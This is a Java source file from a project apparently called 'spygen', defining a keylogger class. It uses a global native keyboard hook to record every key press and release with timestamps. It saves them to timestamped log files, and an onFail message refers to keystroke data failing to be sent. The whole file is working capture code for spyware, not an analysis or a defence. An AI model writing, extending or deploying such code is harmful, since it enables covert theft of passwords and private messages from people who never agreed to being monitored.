package com.houarizegai.spygen.keylogger;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.global.Utils;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;

public class NativeKeyboard implements NativeKeyListener {

    private List<KeyStorage> keyCache = new LinkedList<>();

    public NativeKeyboard() {

    }

    public List<KeyStorage> getKeyCache() {
        return keyCache;
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keyCache.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        keyCache.add(new KeyStorage(e.getKeyCode(), false, System.currentTimeMillis()));
    }

    public void onSave() {
        try {
            FileWriter fw = new FileWriter(Settings.KEYLOGGER_PATH + "logs_" + new Date().toString().replace(" ", "_").replace(":", "-") + ".txt");
            fw.write(Utils.rawPrint(Keylogger.keyboard.getKeyCache()));
            fw.close();
        } catch(IOException ioe) {
            ioe.printStackTrace();
        }

        keyCache.clear();
    }

    public void onFail() {
        System.out.println("Keystroke data fail to be send.");
    }
}
